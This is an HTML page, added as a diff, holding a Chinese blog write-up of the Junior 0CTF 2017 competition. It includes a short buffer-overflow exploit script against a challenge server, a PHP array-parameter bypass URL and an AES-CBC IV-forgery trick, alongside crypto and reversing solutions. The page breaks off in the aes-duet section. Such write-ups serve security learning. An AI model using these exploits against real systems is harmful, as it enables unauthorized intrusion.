@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="学习和生活">
+    <meta name="keyword"  content=" 芈云落, miyunLuo, MiyunLuo Blog">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Junior 0CTF 2017 - Blog Nullptr</title>
+
+    <link rel="canonical" href="http://localhost:4000/2017/12/10/jun0ctf/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <!--<link href="https://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-102635433-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Blog Nullptr</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/tags/">Tags</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/post-bg-0ops.png" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/post-bg-0ops.png')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#CTF" title="CTF">CTF</a>
+                        
+                    </div>
+                    <h1>Junior 0CTF 2017</h1>
+                    
+                    
+                    <h2 class="subheading"> "SJTU校内赛"</h2>
+                    
+                    <span class="meta">Posted by Miyunluo on December 10, 2017</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+				<blockquote>
+  <p>“flag{php_is_best_language_:P}”</p>
+</blockquote>
+
+<h2 id="前言">前言</h2>
+
+<p>SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。</p>
+
+<h2 id="solved">Solved</h2>
+
+<h3 id="1qq-group-50">1.QQ Group 50</h3>
+
+<p>友情送分题，加入QQ交流群送一个flag。</p>
+
+<h3 id="2mystery-numbers-100">2.Mystery Numbers 100</h3>
+
+<p>题目描述没有什么实质性内容。给了一个link[<a href="https://ctf.0ops.sjtu.cn/attachment/download/signal.txt">numbers_f300d7d6dce847a265407e072790370d</a>]，下载得到一个文本文件，内容如下</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239
+</code></pre></div></div>
+
+<p>看到全是字母+数字，而且范围是0到f，以16进制解码到ascii，得到</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9
+</code></pre></div></div>
+<p>之后很像base64，尝试解码得到flag。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">s</span> <span class="o">=</span> <span class="s">'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+
+<span class="o">&gt;&gt;</span><span class="n">flag</span><span class="p">{</span><span class="n">d0_y0u_kn0w_b45364_h4h4_6464_y4y4</span><span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="3easy-traffic-analyze-200">3.Easy Traffic Analyze 200</h3>
+
+<p>题目给了一个link[<a href="https://ctf.0ops.sjtu.cn/upload/flag.pcap">flag.pcap</a>]，是一个通信包文件，但是用wireshark打开提示格式不正确，于是需要先修复pcap文件，可以使用[<a href="https://f00l.de/pcapfix/">pcapfix</a>]软件修复。之后使用wireshark打开，过滤http请求，导出http通信包，有三个文件。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv2.png" alt="img" /></p>
+
+<p>其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件头504B 0304。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv4.png" alt="img" /></p>
+
+<p>将不重要的部分删掉，得到文件更改后缀名为zip解压，得到一张图片（还挺好看的 (●ﾟωﾟ●)。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv5.png" alt="img" /></p>
+
+<p>一般套路都是图片里隐写信息，将图片二进制打开，直接去文件尾，得到flag。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv6.png" alt="img" /></p>
+
+<h3 id="4aes-server-100">4.AES-server 100</h3>
+
+<p>题目给出“nc 202.121.178.199 9999” 与一个文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/server.py">server.py</a>]，文件内容如下，也即是server的代码。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># coding=utf-8</span>
+
+import SocketServer
+from Crypto.Cipher import AES
+
+with open<span class="o">(</span><span class="s1">'secretkey'</span>, <span class="s1">'rb'</span><span class="o">)</span> as f:
+    key <span class="o">=</span> f.read<span class="o">()</span>
+with open<span class="o">(</span><span class="s1">'flag.txt'</span><span class="o">)</span> as f:
+    flag <span class="o">=</span> f.read<span class="o">()</span>
+
+class handler<span class="o">(</span>SocketServer.BaseRequestHandler<span class="o">)</span>:
+
+    def handle<span class="o">(</span>self<span class="o">)</span>:
+        self.request.send<span class="o">(</span><span class="s2">"Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+        self.request.send<span class="o">(</span><span class="s2">"Please input your iv and encrypted message in hex:</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+        
+        data <span class="o">=</span> self.request.recv<span class="o">(</span>1024<span class="o">)</span>.rstrip<span class="o">()</span>
+        try:
+            raw_data <span class="o">=</span> data.decode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>
+        except Exception, e:
+            self.request.send<span class="o">(</span><span class="s2">"Error: {}</span><span class="se">\n</span><span class="s2">"</span>.format<span class="o">(</span>e.message<span class="o">))</span>
+            self.request.close<span class="o">()</span>
+            <span class="k">return
+
+        if </span>len<span class="o">(</span>raw_data<span class="o">)</span> &lt; 32 or len<span class="o">(</span>raw_data<span class="o">)</span> &amp; 0xf:
+            self.request.send<span class="o">(</span><span class="s2">"Your input is not valid!</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+            self.request.close<span class="o">()</span>
+            <span class="k">return
+        
+        </span>iv <span class="o">=</span> raw_data[:16]
+        enc <span class="o">=</span> raw_data[16:]
+        cipher <span class="o">=</span> AES.new<span class="o">(</span>key, AES.MODE_CBC, iv<span class="o">)</span>
+        plain <span class="o">=</span> cipher.decrypt<span class="o">(</span>enc<span class="o">)</span>
+        self.request.send<span class="o">(</span><span class="s2">"Here is your plaintext: {}</span><span class="se">\n</span><span class="s2">"</span>.format<span class="o">(</span>repr<span class="o">(</span>plain<span class="o">)))</span>
+
+        <span class="k">if </span>plain[:5] <span class="o">==</span> <span class="s1">'admin'</span>:
+            self.request.send<span class="o">(</span><span class="s2">"hello, admin! Here is your flag: {}"</span>.format<span class="o">(</span>flag<span class="o">))</span>
+        self.request.close<span class="o">()</span>
+
+
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
+    HOST, PORT <span class="o">=</span> <span class="s2">"localhost"</span>, 9999
+    server <span class="o">=</span> SocketServer.TCPServer<span class="o">((</span>HOST, PORT<span class="o">)</span>, handler<span class="o">)</span>
+    server.serve_forever<span class="o">()</span>
+</code></pre></div></div>
+
+<p>代码里显示为CBC模式的解密过程，要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。</p>
+
+<p>这里使用异或算法的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 )。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv3.png" alt="img" /></p>
+
+<h3 id="5babyrsa-100">5.babyrsa 100</h3>
+
+<p>题目提供了一个压缩文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip">babyrsa.zip</a>]，包含RAS加密的公钥，密文，现在需要求明文。</p>
+
+<p>首先从publicKey.pem中提取n，e</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="n">pub</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">'./publicKey.pem'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">n</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">pub</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">pub</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
+
+<span class="o">&gt;&gt;</span><span class="n">n</span> <span class="o">=</span> <span class="mi">39845701744153150941069529194757526450699838667585381414738119544695931460213</span>
+<span class="o">&gt;&gt;</span><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</code></pre></div></div>
+
+<p>这个公钥的问题出来n选择太小，直接暴力破解质因数，这里可以去[<a href="http://www.factordb.com">factordb</a>]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)</p>
+
+<p><img src="/img/in-post/post-blog-j0serv7.png" alt="img" /></p>
+
+<p>在质因子破p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。</p>
+
+<h3 id="6shatter-sha512-150">6.Shatter Sha512! 150</h3>
+
+<p>题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv0.png" alt="img" /></p>
+
+<p>题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>202.121.178.201：8083?x[]<span class="o">=</span>1&amp;y[]<span class="o">=</span>2
+</code></pre></div></div>
+
+<p>不等条件显然成立，这里x与y都成为<strong>Array</strong>类型，hash值都为<strong>Null</strong>，于是echo $flag.</p>
+
+<p><strong>flag{php_is_best_language_:P}</strong> 被这个漏洞震惊了，果然PHP是最好的语言。</p>
+
+<h3 id="7penetrate-in-150">7.Penetrate In 150</h3>
+
+<p>链接点进去是如下界面</p>
+
+<p><img src="/img/in-post/post-blog-j0serv1.png" alt="img" /></p>
+
+<p>这个题目及其恶心，暂时不表。</p>
+
+<h3 id="8eva-200">8.Eva 200</h3>
+
+<p>这个题出了bug，直接爆出了答案，没有认真做。</p>
+
+<p>For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}</p>
+
+<h3 id="9babyre-100">9.babyre 100</h3>
+
+<p>题目给出一个pyc文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc">encrypt.pyc</a>]，使用在线工具反编译一下[<a href="http://tools.bugscaner.com/decompyle/">decompyle</a>]，得到python源文件，内容如下。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+ 
+<span class="k">def</span> <span class="nf">md5raw</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+ 
+ 
+<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">([</span> <span class="n">i</span> <span class="o">^</span> <span class="n">j</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">])</span>
+ 
+ 
+<span class="n">flag</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">raw_input</span><span class="p">(</span><span class="s">'Show me your flag: '</span><span class="p">))</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">md5raw</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:]))</span>
+    <span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+ 
+<span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="s">'</span><span class="se">\xa5\xc6\xe6\xec</span><span class="s">a</span><span class="se">\x0c</span><span class="s">:ED</span><span class="se">\xed</span><span class="s">#</span><span class="se">\x19\x94</span><span class="s">LF</span><span class="se">\x11\x17\xc4</span><span class="s">.</span><span class="se">\xeb\xa1\xc2</span><span class="s">|</span><span class="se">\xc1</span><span class="s">&lt;</span><span class="se">\xa9\\</span><span class="s">A</span><span class="se">\xde\xd2</span><span class="s">2</span><span class="se">\n</span><span class="s">'</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Right!'</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Wrong!'</span>
+</code></pre></div></div>
+
+<p>这个看代码是典型的Feistel加密，每轮后半部分异或，前后交换，解密就是把过程逆回去。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+<span class="k">def</span> <span class="nf">md5raw</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>  
+<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">([</span> <span class="n">i</span> <span class="o">^</span> <span class="n">j</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">])</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="s">'</span><span class="se">\xa5\xc6\xe6\xec</span><span class="s">a</span><span class="se">\x0c</span><span class="s">:ED</span><span class="se">\xed</span><span class="s">#</span><span class="se">\x19\x94</span><span class="s">LF</span><span class="se">\x11\x17\xc4</span><span class="s">.</span><span class="se">\xeb\xa1\xc2</span><span class="s">|</span><span class="se">\xc1</span><span class="s">&lt;</span><span class="se">\xa9\\</span><span class="s">A</span><span class="se">\xde\xd2</span><span class="s">2</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span> <span class="n">md5raw</span><span class="p">(</span><span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">]))</span>
+    <span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="o">&gt;&gt;</span><span class="n">flag</span><span class="p">{</span><span class="mi">1</span><span class="n">nt3re5tiNg_F3iste1_ciPh3R</span><span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="10encoder-200">10.encoder 200</h3>
+
+<p>逆向题目，链接为[<a href="https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip">encoder.zip</a>]，解压后一个可执行文件，一个加密后的flag”KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=”。使用IDA打开可执行文件进行分析。</p>
+
+<p>（涉及到IDA，之后添加分析与图）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">secret</span><span class="p">):</span>
+    <span class="n">table</span> <span class="o">=</span> <span class="s">'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">40</span>
+    <span class="n">string</span> <span class="o">=</span> <span class="p">[</span><span class="s">''</span><span class="p">]</span><span class="o">*</span><span class="mi">5</span>
+
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">secret</span><span class="p">):</span>
+        <span class="n">index</span> <span class="o">=</span> <span class="n">table</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">-</span><span class="mi">5</span>
+        <span class="k">while</span> <span class="n">index</span><span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
+            <span class="n">message</span><span class="p">[</span><span class="n">start</span><span class="p">]</span> <span class="o">=</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">2</span>
+            <span class="c">#print (message,start,index)</span>
+            <span class="n">index</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
+            <span class="n">start</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">7</span><span class="p">,</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+            <span class="n">num</span> <span class="o">&lt;&lt;=</span> <span class="mi">1</span>
+            <span class="n">num</span> <span class="o">+=</span> <span class="n">message</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
+        <span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="s">"KNByeN88"</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="s">"KqslM52E"</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="s">"1L67aYRE"</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="s">"K1qQ2N1Q"</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="s">"ydYlaEd"</span><span class="p">)))</span>
+
+<span class="o">&gt;&gt;</span><span class="n">flag</span><span class="p">{</span><span class="n">d0_U_Kn0w_ba5e32</span><span class="p">:</span><span class="n">P</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64</p>
+
+<h3 id="11seabreezes-stack-100">11.seabreeze’s stack 100</h3>
+
+<p>题目内容为“nc 202.121.178.181 12321”与一个下载链接[<a href="https://ctf.0ops.sjtu.cn/attachment/download/stack">stack_55a49bdfcdafd0c31657649e905486a4</a>]，使用IDA打开分析。</p>
+
+<p>（涉及到IDA，之后添加分析与图）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="s">'202.121.178.181'</span><span class="p">,</span> <span class="mi">12321</span> <span class="p">))</span>
+<span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">'Do you want to get acquainted with top experts and like-minded friends in computer security?'</span><span class="p">)</span>  
+<span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">'Yes!'</span><span class="p">)</span>  
+<span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">'Do you want to stride forwards on the road of hacking and explore endless possibilities?'</span><span class="p">)</span>  
+<span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">'Yes!!'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">'Do you want to challenge world cutting-edge technology and compete with outstanding hackers?'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">'Yes!!!'</span><span class="p">)</span>
+<span class="n">success_addr</span> <span class="o">=</span> <span class="mh">0x080485cb</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x3fc</span> <span class="o">+</span> <span class="s">"bbbb"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  
+<span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>  
+</code></pre></div></div>
+
+<h2 id="have-idea">Have Idea</h2>
+
+<h3 id="12aes-duet">12.aes-duet</h3>
+
+<p>题目描述为一个链接[<a href="https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip">aes_duet.zip</a>]，解压得到一个密文和加密函数，文件如下</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="k">def</span> <span class="nf">dummy_key_extend</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span>
+    <span class="k">return</span> <span class="n">k</span> <span class="o">*</span> <span class="mi">4</span>
+
+<span class="k">def</span> <span class="nf">aes_duet</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="c"># It is so safe that I use AES twice here!</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
